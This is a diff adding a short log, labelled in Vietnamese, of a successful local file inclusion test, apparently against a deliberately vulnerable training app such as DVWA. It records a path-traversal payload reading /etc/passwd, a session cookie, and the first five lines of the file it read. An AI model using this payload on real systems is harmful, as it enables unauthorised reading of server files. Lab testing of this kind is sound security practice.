@@ -1,0 +1,10 @@
+LFI thành công - đọc được file hệ thống.
+      - Technique  : basic traversal
+      - Payload    : ?page=../../../../../../etc/passwd
+      - Cookie     : security=low; PHPSESSID=kmbt98j2sk7qi9lun4m4l5brq2
+      - /etc/passwd (5 dòng đầu):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
